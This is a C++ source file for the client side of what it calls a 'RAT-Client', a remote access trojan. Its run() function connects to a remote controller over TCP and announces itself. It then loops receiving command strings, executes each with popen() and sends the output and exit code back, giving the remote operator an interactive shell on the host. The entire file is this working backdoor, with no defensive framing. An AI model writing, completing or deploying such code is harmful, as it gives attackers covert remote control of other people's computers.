#include "ClientManager.hpp"
#include <iostream>
#include <thread>
#include <cstdio>
#include <cerrno>

namespace Client {

std::shared_ptr<ClientManager> ClientManager::getInstance() {
    if (!ClientManager::instance) {
        
        
        std::lock_guard<std::mutex> lock(ClientManager::initMutex);
        
        if (!ClientManager::instance) ClientManager::instance.reset(new ClientManager());
    }
    return ClientManager::instance;
}

ClientManager::ClientManager() = default;
ClientManager::~ClientManager() {
    std::lock_guard<std::mutex> lock(mtx_);
    
    if (socket_) socket_->close();
    socket_.reset();
    controllers_.clear();
}

bool ClientManager::connectTo(const std::string &name, const sf::IpAddress &address, unsigned short port) {
    std::lock_guard<std::mutex> lock(mtx_);
    if (socket_) return false; 
    socket_ = std::make_shared<Utils::TCPSocket>();
    if (!socket_->connect(address, port)) {
        socket_.reset();
        return false;
    }
    
    controllers_.emplace(std::piecewise_construct,
                         std::forward_as_tuple(name),
                         std::forward_as_tuple(socket_));
    return true;
}

void ClientManager::disconnect(const std::string &name) {
    std::lock_guard<std::mutex> lock(mtx_);
    
    if (socket_) {
        socket_->close();
        socket_.reset();
    }
    controllers_.erase(name);
}

bool ClientManager::isConnected(const std::string &name) const {
    std::lock_guard<std::mutex> lock(mtx_);
    return socket_ != nullptr && controllers_.find(name) != controllers_.end();
}

ClientController *ClientManager::getController(const std::string &name) {
    std::lock_guard<std::mutex> lock(mtx_);
    auto it = controllers_.find(name);
    if (it == controllers_.end()) return nullptr;
    return &it->second;
}

int ClientManager::run(const sf::IpAddress &address, unsigned short port) {
    const std::string name = "main";
    if (!connectTo(name, address, port)) return 1;
    ClientController *ctrl = getController(name);
    if (!ctrl) return 2;

    
    nlohmann::json out;
    out["msg"] = "Hello from RAT-Client";
    if (!ctrl->sendJson(out)) {
        disconnect(name);
        return 3;
    }

    
    while (isConnected(name)) {
        nlohmann::json in;
        if (!ctrl->receiveJson(in)) {
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        if (in.contains("cmd") && in["cmd"].is_string()) {
            std::string cmd = in["cmd"].get<std::string>();
            
            if (cmd == "exit") break;
            
            std::string output;
            int retcode = 0;
            FILE *p = popen(cmd.c_str(), "r");
            if (!p) {
                output = std::string("popen failed: ") + std::strerror(errno);
                retcode = -1;
            } else {
                char buf[512];
                while (fgets(buf, sizeof(buf), p) != nullptr) {
                    output += buf;
                }
                retcode = pclose(p);
            }
            nlohmann::json reply{ {"out", output}, {"ret", retcode} };
            ctrl->sendJson(reply);
        }
    }

    disconnect(name);
    return 0;
}

} 
